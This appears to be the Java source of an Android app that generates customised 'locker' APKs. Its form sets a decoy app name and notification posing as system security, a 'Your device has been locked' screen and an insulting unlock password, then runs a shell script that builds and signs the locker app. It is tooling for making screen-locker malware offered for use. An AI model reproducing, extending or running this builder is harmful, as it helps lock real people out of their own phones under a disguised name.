package com.lockgen.app;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.InputType;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.util.LinkedHashMap;
import java.util.Map;

public class MainActivity extends Activity {

    private static final String SCRIPT_PATH = "/storage/emulated/0/666/dy/gen_lock.sh";
    private static final String CONFIG_PATH = "/storage/emulated/0/666/dy/lock_config.conf";

    private final LinkedHashMap<String, EditText> stringFields = new LinkedHashMap<>();
    private final LinkedHashMap<String, EditText> colorFields = new LinkedHashMap<>();
    private TextView statusText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(createUI());
    }

    private View createUI() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(dp(16), dp(16), dp(16), dp(16));
        root.setBackgroundColor(Color.parseColor("#1a1a2e"));

        ScrollView scroll = new ScrollView(this);
        LinearLayout container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);

        // Title
        container.addView(makeTitle("锁机APK生成器"));
        container.addView(makeSubtitle("配置锁机应用，一键生成定制APK"));
        container.addView(space(dp(16)));

        // ── String fields ──
        addSection(container, "文本配置");
        addField(container, "应用名称", "app_name", "系统安全");
        addField(container, "中文锁机标题", "lock_title_cn", "你的设备已经被锁定");
        addField(container, "英文锁机标题", "lock_title_en", "Your device has been locked");
        addField(container, "密码", "password", "i m sb");
        addField(container, "密码框提示", "password_hint", "请输入密码");
        addField(container, "密码提示文字", "hint_text", "密码是 i m sb");
        addField(container, "底部文字", "bottom_text", "神秘小鸡踹倒android");
        addField(container, "密码错误提示", "error_wrong", "密码错误! Wrong password!");
        addField(container, "密码正确提示", "error_ok", "Password correct! Unlocking...");
        addField(container, "通知标题", "notif_title", "系统安全");
        addField(container, "通知内容", "notif_text", "设备安全保护中");

        // ── Color fields ──
        addSection(container, "颜色配置 (#AARRGGBB)");
        addField(container, "背景色", "bg_color", "#FF000000");
        addField(container, "标题色", "title_color", "#FFFF0000");
        addField(container, "提示文字色", "hint_color", "#FFFF6666");
        addField(container, "底部文字色", "bottom_color", "#FFFF4444");
        addField(container, "输入框边框色", "input_border", "#FFFF0000");
        addField(container, "错误提示色", "error_color", "#FFFF0000");

        // ── Presets ──
        container.addView(space(dp(12)));
        container.addView(makePresets());

        // ── Status ──
        container.addView(space(dp(12)));
        statusText = new TextView(this);
        statusText.setTextColor(Color.parseColor("#aaaaaa"));
        statusText.setTextSize(13);
        statusText.setGravity(Gravity.CENTER);
        container.addView(statusText);

        // ── Generate button ──
        container.addView(space(dp(16)));
        Button genBtn = new Button(this);
        genBtn.setText("一键生成 APK");
        genBtn.setTextColor(Color.WHITE);
        genBtn.setTextSize(18);
        genBtn.setTypeface(Typeface.DEFAULT_BOLD);
        genBtn.setBackgroundColor(Color.parseColor("#e94560"));
        genBtn.setPadding(dp(24), dp(16), dp(24), dp(16));
        genBtn.setOnClickListener(v -> generateApk());
        LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        bp.setMargins(0, dp(8), 0, dp(24));
        container.addView(genBtn, bp);

        scroll.addView(container);
        root.addView(scroll);
        return root;
    }

    // ── Helpers ──

    private TextView makeTitle(String text) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextColor(Color.parseColor("#e94560"));
        tv.setTextSize(26);
        tv.setTypeface(Typeface.DEFAULT_BOLD);
        tv.setGravity(Gravity.CENTER);
        return tv;
    }

    private TextView makeSubtitle(String text) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextColor(Color.parseColor("#888888"));
        tv.setTextSize(14);
        tv.setGravity(Gravity.CENTER);
        return tv;
    }

    private View space(int h) {
        View v = new View(this);
        v.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, h));
        return v;
    }

    private void addSection(LinearLayout parent, String name) {
        TextView tv = new TextView(this);
        tv.setText(name);
        tv.setTextColor(Color.parseColor("#e94560"));
        tv.setTextSize(16);
        tv.setTypeface(Typeface.DEFAULT_BOLD);
        tv.setPadding(0, dp(16), 0, dp(8));
        parent.addView(tv);
    }

    private void addField(LinearLayout parent, String label, String key, String defaultValue) {
        TextView lbl = new TextView(this);
        lbl.setText(label);
        lbl.setTextColor(Color.parseColor("#cccccc"));
        lbl.setTextSize(13);
        lbl.setPadding(0, dp(6), 0, dp(2));
        parent.addView(lbl);

        EditText et = new EditText(this);
        et.setText(defaultValue);
        et.setTextColor(Color.WHITE);
        et.setTextSize(15);
        et.setBackgroundColor(Color.parseColor("#16213e"));
        et.setPadding(dp(12), dp(10), dp(12), dp(10));
        et.setSingleLine(true);
        if (key.startsWith("password") || key.equals("bg_color")) {
            // keep normal input type
        }
        parent.addView(et, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));

        if (key.contains("color")) {
            colorFields.put(key, et);
        } else {
            stringFields.put(key, et);
        }

        // Color preview for color fields
        if (key.contains("color")) {
            View preview = new View(this);
            try {
                preview.setBackgroundColor(Color.parseColor(defaultValue));
            } catch (Exception e) {
                preview.setBackgroundColor(Color.BLACK);
            }
            preview.setLayoutParams(new LinearLayout.LayoutParams(dp(60), dp(20)));
            LinearLayout.LayoutParams pp = new LinearLayout.LayoutParams(dp(60), dp(20));
            pp.setMargins(0, dp(2), 0, 0);
            parent.addView(preview, pp);
        }
    }

    private LinearLayout makePresets() {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);

        addPresetBtn(row, "经典红黑", () -> {
            fillField("app_name", "系统安全");
            fillField("lock_title_cn", "你的设备已经被锁定");
            fillField("lock_title_en", "Your device has been locked");
            fillField("password", "i m sb");
            fillField("password_hint", "请输入密码");
            fillField("hint_text", "密码是 i m sb");
            fillField("bottom_text", "神秘小鸡踹倒android");
            fillField("bg_color", "#FF000000");
            fillField("title_color", "#FFFF0000");
            fillField("hint_color", "#FFFF6666");
            fillField("bottom_color", "#FFFF4444");
            fillField("input_border", "#FFFF0000");
            fillField("error_color", "#FFFF0000");
        });

        addPresetBtn(row, "赛博蓝", () -> {
            fillField("bg_color", "#FF0a0a2e");
            fillField("title_color", "#FF00d4ff");
            fillField("hint_color", "#FF00aacc");
            fillField("bottom_color", "#FF0088aa");
            fillField("input_border", "#FF00d4ff");
            fillField("error_color", "#FF00ffff");
        });

        addPresetBtn(row, "绿屏黑客", () -> {
            fillField("bg_color", "#FF001a00");
            fillField("title_color", "#FF00ff00");
            fillField("hint_color", "#FF00cc00");
            fillField("bottom_color", "#FF009900");
            fillField("input_border", "#FF00ff00");
            fillField("error_color", "#FF00ff00");
        });

        return row;
    }

    private void addPresetBtn(LinearLayout row, String label, Runnable action) {
        Button btn = new Button(this);
        btn.setText(label);
        btn.setTextSize(12);
        btn.setTextColor(Color.WHITE);
        btn.setBackgroundColor(Color.parseColor("#0f3460"));
        btn.setOnClickListener(v -> action.run());
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0, dp(40), 1f);
        lp.setMargins(dp(4), 0, dp(4), 0);
        row.addView(btn, lp);
    }

    private void fillField(String key, String value) {
        EditText et = stringFields.get(key);
        if (et == null) et = colorFields.get(key);
        if (et != null) et.setText(value);
    }

    // ── Generate ──

    private void generateApk() {
        // Build config
        StringBuilder sb = new StringBuilder();
        sb.append("# 锁机APK配置\n");
        for (Map.Entry<String, EditText> e : stringFields.entrySet()) {
            sb.append(envKey(e.getKey())).append("=\"").append(e.getValue().getText()).append("\"\n");
        }
        for (Map.Entry<String, EditText> e : colorFields.entrySet()) {
            sb.append(envKey(e.getKey())).append("=\"").append(e.getValue().getText()).append("\"\n");
        }

        // Save config
        try {
            File f = new File(CONFIG_PATH);
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(sb.toString().getBytes());
            fos.close();
        } catch (Exception ex) {
            Toast.makeText(this, "保存配置失败: " + ex.getMessage(), Toast.LENGTH_LONG).show();
            return;
        }

        // Try to run script directly
        ProgressDialog pd = new ProgressDialog(this);
        pd.setMessage("正在生成APK...\n请稍候，约需10秒");
        pd.setCancelable(false);
        pd.show();

        new Thread(() -> {
            String result = runScript();
            new Handler(Looper.getMainLooper()).post(() -> {
                pd.dismiss();
                showResult(result);
            });
        }).start();
    }

    private String runScript() {
        StringBuilder out = new StringBuilder();
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", SCRIPT_PATH, "-y");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                out.append(line).append("\n");
            }
            p.waitFor();
        } catch (Exception e) {
            return "执行失败: " + e.getMessage() + "\n请手动在Termux运行:\nbash " + SCRIPT_PATH + " -y";
        }
        return out.toString();
    }

    private void showResult(String output) {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("生成结果");
        if (output.contains("[✓] 签名完成") || output.contains("APK 已生成到")) {
            b.setMessage("APK 生成成功!\n\n输出目录:\n/storage/emulated/0/666/dy/\n\n点击确定查看文件");
            b.setPositiveButton("查看", (d, w) -> {
                try {
                    Intent intent = new Intent(Intent.ACTION_VIEW);
                    intent.setDataAndType(Uri.parse("/storage/emulated/0/666/dy/"), "resource/folder");
                    startActivity(intent);
                } catch (Exception e) {
                    Toast.makeText(this, "请到文件管理器查看", Toast.LENGTH_SHORT).show();
                }
            });
        } else {
            b.setMessage("自动化执行失败，请手动在Termux中运行:\n\nbash /storage/emulated/0/666/dy/gen_lock.sh -y\n\n(配置已自动保存)");
            b.setPositiveButton("知道了", null);
        }
        b.setNegativeButton("关闭", null);
        b.show();
    }

    private String envKey(String key) {
        return key.toUpperCase().replace(" ", "_");
    }

    private int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density + 0.5f);
    }
}
